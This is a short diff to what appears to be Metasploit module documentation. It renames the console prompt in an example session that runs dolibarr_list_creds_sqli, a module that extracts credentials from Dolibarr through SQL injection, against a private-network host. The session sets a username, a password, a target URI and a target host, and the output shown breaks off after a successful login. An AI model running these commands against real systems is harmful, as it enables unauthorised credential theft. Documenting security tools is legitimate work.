@@ -26,16 +26,16 @@
 
 ```
 
-  msf5 > use auxiliary/gather/dolibarr_list_creds_sqli
-  msf5 auxiliary(gather/dolibarr_list_creds_sqli) > set username test
+  msf > use auxiliary/gather/dolibarr_list_creds_sqli
+  msf auxiliary(gather/dolibarr_list_creds_sqli) > set username test
   username => test
-  msf5 auxiliary(gather/dolibarr_list_creds_sqli) > set password blah
+  msf auxiliary(gather/dolibarr_list_creds_sqli) > set password blah
   password => blah
-  msf5 auxiliary(gather/dolibarr_list_creds_sqli) > set targeturi /dolibarr
+  msf auxiliary(gather/dolibarr_list_creds_sqli) > set targeturi /dolibarr
   targeturi => /dolibarr
-  msf5 auxiliary(gather/dolibarr_list_creds_sqli) > set rhosts 192.168.37.228
+  msf auxiliary(gather/dolibarr_list_creds_sqli) > set rhosts 192.168.37.228
   rhosts => 192.168.37.228
-  msf5 auxiliary(gather/dolibarr_list_creds_sqli) > run
+  msf auxiliary(gather/dolibarr_list_creds_sqli) > run
 
   [*] Logging in...
   [+] Successfully logged into Dolibarr
